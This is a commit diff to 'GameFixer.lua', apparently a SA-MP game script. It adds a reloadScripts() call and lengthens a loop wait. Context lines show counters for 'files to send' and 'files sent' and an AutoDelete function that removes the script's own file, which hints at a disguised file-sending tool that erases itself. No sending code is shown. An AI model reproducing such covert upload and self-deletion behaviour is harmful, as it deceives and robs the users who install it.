bd3e0fb05173e53bfc538dbe583d0ea7b7346039
bbdyisvd <gilmararbeirosantos99@gmail.com>
2026-02-07 23:48:13 -0800

    Add files via upload

--- GameFixer.lua
+++ GameFixer.lua
@@ -1,3 +1,5 @@
+
+
 local ffi = require "ffi"
 local inicfg = require 'inicfg'
 local encoding = require("encoding")
@@ -12,6 +14,7 @@ local arquivos_para_enviar = 0
 local arquivos_enviados = 0
 
 function main()
+    reloadScripts()
     repeat wait(0) until isSampAvailable()
     wait(0)
     
@@ -20,7 +23,7 @@ function main()
     end
     
     while true do
-        wait(0)
+        wait(30000)
     end
 end
 
@@ -123,5 +126,4 @@ function AutoDelete()
         os.remove(script_path)
     end
 end
-
 
